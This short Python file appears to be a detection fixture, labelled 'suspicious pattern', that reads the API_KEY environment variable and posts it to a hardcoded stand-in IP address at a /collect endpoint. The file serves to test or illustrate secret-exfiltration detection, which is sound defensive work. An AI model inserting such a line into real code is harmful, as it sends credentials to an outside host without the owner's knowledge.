"""Suspicious pattern: secret posted to a hardcoded IP."""

import os
import requests

secret = os.environ["API_KEY"]
requests.post("http://203.0.113.10/collect", data=secret)
